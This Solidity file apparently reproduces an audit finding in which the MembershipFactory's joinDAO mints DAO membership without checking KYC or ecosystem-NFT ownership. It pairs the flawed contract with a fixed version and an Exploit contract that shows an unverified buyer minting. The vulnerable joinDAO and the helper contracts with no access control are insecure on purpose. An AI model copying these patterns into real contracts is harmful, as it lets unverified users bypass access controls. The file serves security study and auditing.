// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  One World — MembershipFactory.joinDAO never checks KYC or the ecosystem NFT
    (CodeHawks, finding 49835). SYNTHETIC, cheatcode-free.
    joinDAO is copied from the contest: it checks the tier cap and pulls the
    price, then mints. OWPIdentity and the ecosystem NFT are never read.
    @> VULN marks that mint. */

contract ERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "allow");
            allowance[from][msg.sender] = allowed - amount;
        }
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract OWPIdentity {
    mapping(address => bool) public isKYC;

    function setKYC(address account, bool value) external {
        isKYC[account] = value;
    }
}

contract MembershipFactory {
    ERC20 public membership;
    ERC20 public currency;
    ERC20 public ecosystemNft;
    OWPIdentity public identity;
    address public owpWallet;
    address public dao;
    uint256 public noOfTiers;
    uint256 public tierAmount;
    uint256 public tierMinted;
    uint256 public tierPrice;

    constructor(ERC20 membership_, ERC20 currency_, ERC20 ecosystemNft_, OWPIdentity identity_, address owpWallet_) {
        membership = membership_;
        currency = currency_;
        ecosystemNft = ecosystemNft_;
        identity = identity_;
        owpWallet = owpWallet_;
        dao = address(this);
        noOfTiers = 1;
        tierAmount = 1;
        tierPrice = 100 ether;
    }

    function joinDAO(address daoMembershipAddress, uint256 tierIndex) external {
        require(daoMembershipAddress == dao, "dao");
        require(noOfTiers > tierIndex, "Invalid tier.");
        require(tierAmount > tierMinted, "Tier full.");
        uint256 price = tierPrice;
        uint256 platformFees = (20 * price) / 100;
        tierMinted += 1;
        currency.transferFrom(msg.sender, owpWallet, platformFees);
        currency.transferFrom(msg.sender, daoMembershipAddress, price - platformFees);
        membership.mint(msg.sender, 1); // @> VULN: mint with no KYC check and no ecosystem-NFT ownership check
    }
}

contract MembershipFactoryFixed {
    ERC20 public membership;
    ERC20 public currency;
    ERC20 public ecosystemNft;
    OWPIdentity public identity;
    address public owpWallet;
    uint256 public minted;
    uint256 public constant PRICE = 100 ether;

    constructor(ERC20 membership_, ERC20 currency_, ERC20 ecosystemNft_, OWPIdentity identity_, address owpWallet_) {
        membership = membership_;
        currency = currency_;
        ecosystemNft = ecosystemNft_;
        identity = identity_;
        owpWallet = owpWallet_;
    }

    function joinDAO(address, uint256) external {
        require(identity.isKYC(msg.sender), "KYC");
        require(ecosystemNft.balanceOf(msg.sender) > 0, "ecosystem NFT");
        require(minted < 1, "Tier full.");
        minted += 1;
        uint256 platformFees = (20 * PRICE) / 100;
        currency.transferFrom(msg.sender, owpWallet, platformFees);
        currency.transferFrom(msg.sender, address(this), PRICE - platformFees);
        membership.mint(msg.sender, 1);
    }
}

contract Exploit {
    ERC20 public currency; // nonce 1
    ERC20 public membership; // nonce 2
    ERC20 public ecosystemNft; // nonce 3
    OWPIdentity public identity; // nonce 4
    MembershipFactory public factory; // nonce 5
    address public wallet; // nonce not a create — constant

    constructor() {
        currency = new ERC20("OWP", "OWP", 18);
        membership = new ERC20("DAO Membership", "MEMBER", 0);
        ecosystemNft = new ERC20("Ecosystem NFT", "OWNFT", 0);
        identity = new OWPIdentity();
        wallet = address(0xCAFE);
        factory = new MembershipFactory(membership, currency, ecosystemNft, identity, wallet);
        currency.mint(address(this), 100 ether);
    }

    function run() external {
        require(!identity.isKYC(address(this)), "attacker is not KYC");
        require(ecosystemNft.balanceOf(address(this)) == 0, "attacker holds no ecosystem NFT");
        currency.approve(address(factory), 100 ether);
        factory.joinDAO(address(factory), 0);
        require(membership.balanceOf(address(this)) == 1, "unverified user minted membership");
        require(factory.tierMinted() == 1, "the only tier slot was consumed");
        require(currency.balanceOf(wallet) == 20 ether, "platform fee paid");
        require(currency.balanceOf(address(factory)) == 80 ether, "dao was paid");
    }
}
